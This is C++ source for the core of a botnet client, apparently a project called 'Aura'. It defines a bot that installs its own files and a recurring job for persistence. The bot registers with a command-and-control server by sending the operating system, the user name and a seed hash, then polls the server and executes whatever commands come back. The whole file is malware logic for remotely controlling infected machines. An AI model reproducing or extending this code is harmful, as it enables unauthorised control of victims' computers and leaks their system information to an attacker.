#include <memory>
#include <string>

#include "command.hh"
#include "request.hh"
#include "seed.hh"
#include "system.hh"

const std::string HASH_TYPE("SHA256");

class C2Server {
   public:
    C2Server(const std::string& register_url, const std::string& command_url) {
        register_url_ = register_url;
        command_url_ = command_url;
    }

    std::string GetRegisterUrl() { return register_url_; }
    std::string GetCommandUrl() { return command_url_; }

   private:
    std::string register_url_, command_url_;
};

class Bot {
   public:
    Bot(const std::string& seed_path, const std::string& register_url,
        const std::string& command_url) {
        hash_type_ = HASH_TYPE;
        seed_ = std::make_unique<Seed>(seed_path);
        c2_server_ = std::make_unique<C2Server>(register_url, command_url);
    }

    void Init();
    bool IsInit();
    void RegisterBot();
    void ExecuteCommand();

   private:
    std::string hash_type_, hash_sum_, os_, user_;
    std::unique_ptr<Seed> seed_;
    std::unique_ptr<C2Server> c2_server_;

    void PrepareSysInfo_();
};

void Bot::Init() {
    // Install files and components
    install::InstallFiles();
    seed_->InitSeed();
    RegisterBot();
    install::InitRecurringJob();
}

bool Bot::IsInit() { return seed_->Exists(); }

void Bot::RegisterBot() {
    // Register bot with C2 server
    PrepareSysInfo_();
    request::PostForm post_form;
    post_form.AddField("version", AURA_VERSION);
    post_form.AddField("hash_type", hash_type_);
    post_form.AddField("hash_sum", hash_sum_);
    post_form.AddField("operating_sys", os_);
    post_form.AddField("user", user_);
    request::Post(c2_server_->GetRegisterUrl(), post_form.ToString());
}

void Bot::ExecuteCommand() {
    // Update system info and create POST form
    PrepareSysInfo_();
    request::PostForm post_form;
    post_form.AddField("version", AURA_VERSION);
    post_form.AddField("hash_sum", hash_sum_);

    std::string response =
        request::Post(c2_server_->GetCommandUrl(), post_form.ToString());

    // Parse response and execute based on JSON data
    Command cmd(response);
    cmd.Execute();
}

void Bot::PrepareSysInfo_() {
    // Init or retrieve seed
    if (seed_->Exists()) {
        seed_->GetSeed();
    } else {
        seed_->InitSeed();
    }

    // Retrieve values if they haven't been already
    if (!(hash_sum_.size())) {
        hash_sum_ = seed_->GetHash();
    }
    if (!(os_.size())) {
        os_ = util::GetOS();
    }
    if (!(user_.size())) {
        user_ = util::GetUser();
    }
}